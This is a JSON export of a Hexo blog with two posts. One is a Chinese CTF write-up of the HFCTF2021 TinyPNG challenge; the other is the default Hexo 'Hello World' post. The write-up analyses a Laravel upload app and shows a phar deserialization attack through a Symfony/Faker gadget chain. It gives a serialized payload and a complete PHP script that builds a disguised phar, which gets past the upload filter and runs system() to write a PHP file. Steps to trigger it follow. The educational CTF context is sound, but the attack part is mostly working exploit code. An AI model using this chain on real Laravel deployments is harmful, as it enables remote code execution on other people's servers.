[{"title":"HFCTF2021 TinyPNG 复现","url":"/20210429/HFCTF2021-TinyPNG/","content":"HFCTF2021 TinyPNG感谢 Naivekun 师傅的帮助\n因为题目没有给全环境，所以自己 docker 搭了个环境，和 Buu 上的好像不太一样，回头再研究\ndocker 环境我会放在我的 GitHub 上，复现环境\n阅读源码先阅读源码，搞清楚这个 Web 应用的具体功能和流程\nLaravel 框架的默认路由位于 routes/web.php 下 \n&lt;?php\n//...    \n\nRoute::get('/', function () &#123;\n    return view('upload');\n&#125;);\nRoute::post('/', [IndexController::class, 'fileUpload'])->name('file.upload.post');\n\n//Don't expose the /image to others!\nRoute::get('/image', [ImageController::class, 'handle'])->name('image.handle');\n\n所以很容易得到这个应用有三条路由\n第一条路由是返回 upload 页面，视图文件位于 resources/views/*\n其他两条路由，分别看他们对应的类和方法，位于 app/Http/Controllers/*\n# app/Http/Controllers/IndexController.php\n\n&lt;?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass IndexController extends Controller\n&#123;\n    public function fileUpload(Request $req)\n    &#123;\n        $allowed_extension = \"png\";\n        $extension = $req->file('file')->clientExtension();\n        if($extension === $allowed_extension &amp;&amp; $req->file('file')->getSize() &lt; 204800)\n        &#123;\n            $content = $req->file('file')->get();\n            if (preg_match(\"/&lt;\\?|php|HALT\\_COMPILER/i\", $content ))&#123;\n                $error = 'Don\\'t do that, please';\n                return back()\n                    ->withErrors($error);\n            &#125;else &#123;\n                $fileName = \\md5(time()) . '.png';\n                $path = $req->file('file')->storePubliclyAs('uploads', $fileName);\n                echo \"path: $path\";\n                return back()\n                    ->with('success', 'File has been uploaded.')\n                    ->with('file', $path);\n            &#125;\n        &#125; else&#123;\n            $error = 'Don\\'t do that, please';\n            return back()\n                ->withErrors($error);\n        &#125;\n\n\n    &#125;\n&#125;\n\nIndexController 的 fileUpload 方法实现了一个文件上传的功能\n\n上传的文件后缀名只能以 .png 结尾\n\n上传的文件会被存储在 public/uploads文件夹内，文件名不可控，为 \\md5(time()) . &#39;.png&#39;\n\n对 &lt;?、php、HALT_COMPILER 字符串进行了过滤\n\n上传成功后会返回储存的路径\n\n\n# app/Http/Controllers/ImageController.php\n\n&lt;?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass ImageController extends Controller\n&#123;\n    public function handle(Request $request)\n    &#123;\n        $source = $request->input('image');\n        if(empty($source))&#123;\n            return view('image');\n        &#125;\n        $temp = explode(\".\", $source);\n        $extension = end($temp);\n        if ($extension !== 'png') &#123;\n            $error = 'Don\\'t do that, pvlease';\n            return back()\n                ->withErrors($error);\n        &#125; else &#123;\n            $image_name = md5(time()) . '.png';\n            $dst_img = '/var/www/html/' . $image_name;\n            $percent = 1;\n            (new imgcompress($source, $percent))->compressImg($dst_img);\n            return back()->with('image_name', $image_name);\n        &#125;\n    &#125;\n&#125;\n\nImageController 的 handle 方法实现了一个压缩图片的功能\n\n实现了，但又没有完全实现\n读取 Request 中传入的 image 作为目标图片路径\n读取该图片，调用 imgcompress 类中的 compressImg 方法对图片进行压缩\n压缩完成后返回图片的路径\n\n在来看看调用的 imgcompress 类，因为比较长，所以截取关键部分贴上来\n# app/Http/Controllers/imgcompress.php\n\n&lt;?php\n\nclass imgcompress\n&#123;\n\t//...\n    \n\t/**\n     * 内部：打开图片\n     */\n    private function _openImage()\n    &#123;\n        list($width, $height, $type, $attr) = getimagesize($this->src);\n        $this->imageinfo = array(\n            'width' => $width,\n            'height' => $height,\n            'type' => image_type_to_extension($type, false),\n            'attr' => $attr\n        );\n        $fun = \"imagecreatefrom\" . $this->imageinfo['type'];\n        $this->image = $fun($this->src);\n        $this->_thumpImage();\n    &#125;\n    \n    //...\n&#125;\n\n在 _openImage 方法中，getimagesize 函数会打开一个文件\n而且在 PHP 4.0.5 支持后支持通过 URL 打开\n\n于是这里我们就可以夹带私货了，比如说 phar://\n修洞先看路由 routes/web.php\nRoute::get('/', function () &#123;\n    return view('upload');\n&#125;);\nRoute::post('/', [IndexController::class, 'fileUpload'])->name('file.upload.post');\n\n//Don't expose the /image to others!\nRoute::get('/image', [ImageController::class, 'handle'])->name('image.handle');\n\n可以看到 //Don&#39;t expose the /image to others!\n所以修洞很简单，直接注释掉/image路由即可\n打洞题目给了Apache的配置文件，开启了目录重写\n所以访问/index.php/image即可访问到/image路由\n然后这一题可以上传文件，可以读取文件，打一个 phar 反序列化\n参考文章：一道CTF题引起的对laravel v8.32.1序列化利用链挖掘\n题目环境里给出了 Laravel 的版本\n\"require\": &#123;\n        \"php\": \"^7.3|^8.0\",\n        \"fideloper/proxy\": \"^4.4\",\n        \"fruitcake/laravel-cors\": \"^2.0\",\n        \"guzzlehttp/guzzle\": \"^7.0.1\",\n        \"laravel/framework\": \"^8.12\",\n        \"laravel/tinker\": \"^2.5\"\n    &#125;,\n\n所以照文章找一条链下来是个不错的选择\nImportConfigurator 类第一个是 Symfony\\Component\\Routing\\Loader\\Configurator 中的类 ImportConfigurator\n该类存在一个包含了语句 $this-&gt;xxx-&gt;xxx() 的 __destruct 方法\n这样我们可以控制 $this-&gt;xxx，从而执行一些预期之外的方法\n# vendor/symfony/routing/Loader/Configurator/ImportConfigurator.php\n\nclass ImportConfigurator\n&#123;\n    private $parent;\n    //...\n    public function __destruct()\n        &#123;\n            $this->parent->addCollection($this->route);\n        &#125;\n    //...\n&#125;\n\n因为函数名不可控，找一个有 __call 方法的类\n比如说 Faker 中的类 ValidGenerator\nValidGenerator 类# vendor/fakephp/faker/src/Faker/ValidGenerator.php\n\nclass ValidGenerator\n&#123;\n    protected $generator;\n    protected $validator;\n    protected $maxRetries;\n    //...\n    public function __call($name, $arguments)\n        &#123;\n            $i = 0;\n            do &#123;\n                $res = call_user_func_array([$this->generator, $name], $arguments);\n                $i++;\n                if ($i > $this->maxRetries) &#123;\n                    throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));\n                &#125;\n            &#125; while (!call_user_func($this->validator, $res));\n\n            return $res;\n        &#125;\n    //...\n&#125;\n\n选用这个类是因为这个 __call 方法中包含了清晰可见的 call_user_func_array 和 call_user_func\n可以发现 call_user_func 的参数 $this-&gt;validator 是可控的\n而另一个参数 $res 是从 call_user_func_array 函数中获得的返回值\ncall_user_func_array 的参数中，$this-&gt;generator 是可控的\n但我们无法控制他的返回值，即无法控制 $res\n另一个参数 $name 是不可控的，且值为 addCollection\n另外我们为了触发一次 call_user_func，这里选择将 $this-&gt;MaxRetries 置为 1 即可\n\nDefaultGenerator 类我们再看到 Faker 中的类 DefaultGenerator\n# vendor/fakephp/faker/src/Faker/DefaultGenerator.php\n\nclass DefaultGenerator\n&#123;\n    protected $default;\n\t//...\n\tpublic function __call($method, $attributes)\n    \t&#123;\n        \treturn $this->default;\n    \t&#125;\n    //...\n&#125;\n\n这里的 __call 方法会返回一个我们完全可控的 $this-&gt;default\n于是到这里，ValidGenerator 中的 $res 参数就是我们可以控制的了\n调用链梳理一下调用链\n&lt;?php\n\nclass ImportConfigurator\n&#123;\n    public function __destruct()\n    &#123;\n        $this->parent->addCollection($this->route);\n    &#125;\n&#125;\n\nclass ValidGenerator\n&#123;\n    public function __call($name, $arguments)\n    &#123;\n        $i = 0;\n        do &#123;\n            $res = call_user_func_array([$this->generator, $name], $arguments);\n            $i++;\n            if ($i > $this->maxRetries) &#123;\n                throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));\n            &#125;\n        &#125; while (!call_user_func($this->validator, $res));\n\n        return $res;\n    &#125;\n&#125;\n\nclass DefaultGenerator\n&#123;\n    public function __call($method, $attributes)\n        &#123;\n            return $this->default;\n        &#125;\n&#125;\n\n1、通过 ImportConfigurator 类的 __destruct 方法触发 ValidGenerator 类的 __call 方法\n2、ValidGenerator 类的 __call 方法中的 call_user_func_array 函数\n3、触发 DefaultGenerator 类的 __call 方法\n4、DefaultGenerator 类的 __call 方法返回值完全可控\n5、ValidGenerator 类的 __call 方法中的 call_user_func_array 函数返回值 $res 可控\n6、ValidGenerator 类的 __call 方法中 call_user_func 函数的两个参数都可控\n条件梳理\n\nImportConfigurator-&gt;parent = ValidGenerator 类\nValidGenerator-&gt;maxRetries = 1\nValidGenerator-&gt;generator = DefaultGenerator 类\nDefaultGenerator-&gt;default = [任意可控函数参数]\nValidGenerator-&gt;validator = [任意可控函数名称]\n\nphar 反序列化phar 反序列化是 BlackHat 2018 公布的一种不需要 unserialize 函数就能触发反序列化的方法\n因为百度出来的复制来复制去都是那几篇文章，这里附一份 BlackHat 2018 的讲义\nPHAR 文件是 PHP Archieve 的缩写，也就是类似于 Java 的 JAR 包的一种压缩文件\n\nPHP 在读取 PHAR 文件的时候会对 .phar/.metadata.bin 中的内容进行反序列化\n# exp1.phar.tar.gz/.phar/.metadata.bin\n\nO:64:\"Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator\":1:&#123;s:72:\" Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator parent\";O:20:\"Faker\\ValidGenerator\":3:&#123;s:12:\" * generator\";O:22:\"Faker\\DefaultGenerator\":1:&#123;s:10:\" * default\";s:34:\"echo \"&lt;?php phpinfo(); ?>\" > 1.php\";&#125;s:12:\" * validator\";s:6:\"system\";s:13:\" * maxRetries\";i:1;&#125;&#125;\n\n而 .phar/stub.php 是 PHAR 文件的一个标志，即 __HALT_COMPILER(); ?&gt;\n\nPHP 不会理会这个标志前面是什么东西，他只管把这个标志后面的部分作为 PHAR 包来解析\ntest.txt 是随便一个什么东西，是一个为了完成压缩而随意构造的东西，PHAR 反序列化的重点也不在这里 2333\n因此只要 PHP 能以 phar:// 协议读取这个文件，我们的目的就达到了\nEXP&lt;?php\n\nnamespace Symfony\\Component\\Routing\\Loader\\Configurator&#123;\n    class ImportConfigurator&#123;\n        private $parent;\n        function __construct($c1)&#123;\n            $this->parent = $c1;\n        &#125;\n    &#125;\n&#125;\nnamespace Faker&#123;\n    class DefaultGenerator&#123;\n        protected $default;\n        function __construct($param)&#123;\n            $this->default = $param;\n        &#125;\n    &#125;\n    class ValidGenerator&#123;\n        protected $generator;\n        protected $validator;\n        protected $maxRetries;\n        function __construct($func,$param)&#123;\n            $this->generator = new DefaultGenerator($param);\n            $this->maxRetries = 1;\n            $this->validator = $func;\n        &#125;\n    &#125;\n&#125;\nnamespace&#123;\n    $phar = new Phar('exp1.phar');\n    \n    $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ);\n    \n    $phar->startBuffering();\n    $phar->setStub('&lt;?php __HALT_COMPILER();?>');\n    $phar->addFromString('test.txt', 'test');\n    $o = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator(\n        new Faker\\ValidGenerator('system','echo \"&lt;?php phpinfo(); ?>\" > 1.php')\n    );\n    $phar->setMetadata($o);\n    $phar->stopBuffering();\n    echo serialize($o);\n&#125;\n\n因为上传文件有对 stub 和 php 的过滤，加一行语句压缩一下就能过\n压缩后的文件内容\n\n足够抽象了吧 233\n生成出来的 exp1.phar.tar.gz，改名为 exp1.png\nP.S. 因为 PHP 8 在遇到异常的时候会作为错误处理，停止执行代码\n所以如果题目环境是 PHP 8 好像是打不通的 (我是 Manjaro 神教，被坑了不短时间 2333)\n\n上传文件，然后访问路由 /index.php/image?image=phar://./uploads/xxxxxxx.png\n\n\n会返回 500 错误，我开了 Laravel DEBUG 所以页面上有详细信息\n但是 phar 反序列化已经执行了，所以会在 public 目录生成一个 1.php\n\n访问 /1.php 即可\n","categories":[],"tags":["CTF WriteUp"]},{"title":"Hello World","url":"/20201007/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":[],"tags":[]}]